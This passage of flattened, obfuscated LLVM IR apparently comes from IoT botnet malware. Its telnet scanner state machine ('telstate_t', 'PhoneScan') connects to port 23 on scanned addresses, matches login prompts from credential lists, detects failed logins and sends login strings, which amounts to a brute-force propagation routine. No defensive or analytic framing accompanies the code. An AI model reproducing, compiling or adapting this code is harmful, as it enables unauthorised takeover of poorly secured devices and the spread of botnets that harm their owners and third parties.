  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload29, 0
  %100 = select i1 %SwitchLeaf, i32 657637744, i32 2079401573
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* %2, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 3
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 1
  %109 = select i1 %108, i32 262765329, i32 -1013606877
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 9
  %115 = load i8*, i8** %114, align 8
  store i8* %115, i8** %16, align 8
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %117
  %119 = bitcast %struct.telstate_t* %118 to i8*
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 32, i32 16, i1 false)
  %120 = load i8*, i8** %16, align 8
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  store i8* %120, i8** %124, align 8
  %125 = call i32 @PhoneScan()
  %126 = load i32, i32* %2, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 1
  store i32 %125, i32* %129, align 4
  store i32 -1013606877, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = call zeroext i16 @htons(i16 zeroext 23) #13
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %135 = getelementptr inbounds [8 x i8], [8 x i8]* %134, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %135, i8 0, i64 8, i32 4, i1 false)
  %136 = load i32, i32* %2, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %142 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %141, i32 0, i32 0
  store i32 %140, i32* %142, align 4
  %143 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %144 = load i32, i32* %2, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 0
  store i32 %143, i32* %147, align 16
  %148 = load i32, i32* %2, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 16
  %153 = icmp eq i32 %152, -1
  %154 = select i1 %153, i32 751804811, i32 -2077045609
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %2, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 0
  %161 = load i32, i32* %160, align 16
  %162 = load i32, i32* %2, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 16
  %167 = call i32 (i32, i32, ...) @fcntl(i32 %166, i32 3, i8* null)
  %168 = or i32 %167, 2048
  %169 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i32 %168)
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 16
  %175 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %176 = call i32 @connect(i32 %174, %struct.sockaddr* %175, i32 16)
  %177 = icmp eq i32 %176, -1
  %178 = select i1 %177, i32 -583749265, i32 -1008033519
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = call i32* @__errno_location() #13
  %181 = load i32, i32* %180, align 4
  %182 = icmp ne i32 %181, 115
  %183 = select i1 %182, i32 -1428971577, i32 -1008033519
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %2, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 16
  %190 = call i32 @sclose(i32 %189)
  %191 = load i32, i32* %2, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 3
  store i8 1, i8* %194, align 1
  store i32 -1901787428, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 2
  store i8 1, i8* %199, align 8
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 7
  store i32 0, i32* %203, align 16
  store i32 -1901787428, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -83512326, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %208 = getelementptr inbounds [16 x i64], [16 x i64]* %207, i64 0, i64 0
  %209 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %208) #5, !srcloc !6
  %210 = extractvalue { i64, i64* } %209, 0
  %211 = extractvalue { i64, i64* } %209, 1
  %212 = trunc i64 %210 to i32
  store i32 %212, i32* %17, align 4
  %213 = ptrtoint i64* %211 to i64
  %214 = trunc i64 %213 to i32
  store i32 %214, i32* %18, align 4
  store i32 -1032660899, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  store i32 -835864942, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i32, i32* %2, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = srem i32 %221, 64
  %223 = zext i32 %222 to i64
  %224 = shl i64 1, %223
  %225 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %226 = load i32, i32* %2, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 16
  %231 = sdiv i32 %230, 64
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [16 x i64], [16 x i64]* %225, i64 0, i64 %232
  %234 = load i64, i64* %233, align 8
  %235 = or i64 %234, %224
  store i64 %235, i64* %233, align 8
  %236 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 0, i64* %236, align 8
  %237 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 10000, i64* %237, align 8
  %238 = load i32, i32* %2, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 16
  %243 = add nsw i32 %242, 1
  %244 = call i32 @select(i32 %243, %struct.__sigset_t* null, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %10)
  store i32 %244, i32* %3, align 4
  %245 = load i32, i32* %3, align 4
  %246 = icmp eq i32 %245, 1
  %247 = select i1 %246, i32 -1164012657, i32 2139365212
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 4, i32* %11, align 4
  store i32 0, i32* %5, align 4
  %249 = load i32, i32* %2, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 16
  %254 = bitcast i32* %5 to i8*
  %255 = call i32 @getsockopt(i32 %253, i32 1, i32 4, i8* %254, i32* %11) #5
  %256 = load i32, i32* %5, align 4
  %257 = icmp ne i32 %256, 0
  %258 = select i1 %257, i32 -650326822, i32 74247854
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i32, i32* %2, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 0
  %264 = load i32, i32* %263, align 16
  %265 = call i32 @sclose(i32 %264)
  %266 = load i32, i32* %2, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 2
  store i8 0, i8* %269, align 8
  %270 = load i32, i32* %2, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 3
  store i8 1, i8* %273, align 1
  store i32 -1220744435, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i32, i32* %2, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = load i32, i32* %2, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = call i32 (i32, i32, ...) @fcntl(i32 %284, i32 3, i8* null)
  %286 = and i32 %285, -2049
  %287 = call i32 (i32, i32, ...) @fcntl(i32 %279, i32 4, i32 %286)
  %288 = load i32, i32* %2, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 7
  store i32 0, i32* %291, align 16
  %292 = load i32, i32* %2, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %293
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 8
  store i16 0, i16* %295, align 4
  %296 = load i32, i32* %2, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 9
  %300 = load i8*, i8** %299, align 8
  call void @llvm.memset.p0i8.i64(i8* %300, i8 0, i64 512, i32 1, i1 false)
  %301 = load i32, i32* %2, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 2
  store i8 2, i8* %304, align 8
  store i32 -1220744435, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i32, i32* %3, align 4
  %308 = icmp eq i32 %307, -1
  %309 = select i1 %308, i32 -1745248890, i32 -483344678
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = call i32 @sclose(i32 %315)
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 2
  store i8 0, i8* %320, align 8
  %321 = load i32, i32* %2, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 3
  store i8 1, i8* %324, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  store i32 -769184313, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 7
  %331 = load i32, i32* %330, align 16
  %332 = add i32 %331, 6
  %333 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %334 = icmp ult i32 %332, %333
  %335 = select i1 %334, i32 2021124846, i32 1295424851
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = call i32 @sclose(i32 %341)
  %343 = load i32, i32* %2, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 2
  store i8 0, i8* %346, align 8
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 3
  store i8 1, i8* %350, align 1
  store i32 1295424851, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %2, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 16
  %358 = load i32, i32* %2, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 9
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @read_until_response(i32 %357, i32 10000, i8* %362, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %364 = icmp ne i32 %363, 0
  %365 = select i1 %364, i32 -1790969529, i32 -602403282
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %2, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 9
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @contains_fail(i8* %371)
  %373 = icmp ne i32 %372, 0
  %374 = select i1 %373, i32 1483293000, i32 217750618
  store i32 %374, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 2
  store i8 0, i8* %379, align 8
  store i32 1293514272, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load i32, i32* %2, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 2
  store i8 3, i8* %384, align 8
  store i32 1293514272, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %2, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 7
  %391 = load i32, i32* %390, align 16
  %392 = add i32 %391, 6
  %393 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %394 = icmp ult i32 %392, %393
  %395 = select i1 %394, i32 -809614537, i32 1246782375
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i32, i32* %2, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %398
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %399, i32 0, i32 2
  store i8 0, i8* %400, align 8
  %401 = load i32, i32* %2, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 3
  store i8 1, i8* %404, align 1
  store i32 1246782375, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 0
  %411 = load i32, i32* %410, align 16
  %412 = call i64 @send(i32 %411, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %413 = icmp slt i64 %412, 0
  %414 = select i1 %413, i32 728085230, i32 117276689
  store i32 %414, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 2
  store i8 0, i8* %419, align 8
  %420 = load i32, i32* %2, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %421
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %422, i32 0, i32 3
  store i8 1, i8* %423, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i32, i32* %2, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 2
  store i8 4, i8* %428, align 8
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = load i32, i32* %2, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 16
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 9
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @read_until_response(i32 %434, i32 10000, i8* %439, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %441 = icmp ne i32 %440, 0
  %442 = select i1 %441, i32 1693447444, i32 -513412499
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 9
  %448 = load i8*, i8** %447, align 8
  %449 = call i32 @contains_fail(i8* %448)
  %450 = icmp ne i32 %449, 0
  %451 = select i1 %450, i32 -592097680, i32 1234463951
  store i32 %451, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i32, i32* %2, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 2
  store i8 0, i8* %456, align 8
  store i32 -1597126261, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 2
  store i8 5, i8* %461, align 8
  store i32 -1597126261, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 7
  %468 = load i32, i32* %467, align 16
  %469 = add i32 %468, 6
  %470 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %471 = icmp ult i32 %469, %470
  %472 = select i1 %471, i32 1648499259, i32 314951247
  store i32 %472, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 2
  store i8 0, i8* %477, align 8
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 3
  store i8 1, i8* %481, align 1
  store i32 314951247, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 0
  %488 = load i32, i32* %487, align 16
  %489 = call i64 @send(i32 %488, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %490 = icmp slt i64 %489, 0
  %491 = select i1 %490, i32 1032440875, i32 -1874910161
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i32, i32* %2, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 2
  store i8 0, i8* %496, align 8
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 3
  store i8 1, i8* %500, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 2
  store i8 6, i8* %505, align 8
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = load i32, i32* %2, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 9
  %516 = load i8*, i8** %515, align 8
  %517 = call i32 @read_until_response(i32 %511, i32 10000, i8* %516, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %518 = icmp ne i32 %517, 0
  %519 = select i1 %518, i32 1044108813, i32 -1037576025
  store i32 %519, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %522 = load i32, i32* %2, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 7
  store i32 %521, i32* %525, align 16
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 9
  %530 = load i8*, i8** %529, align 8
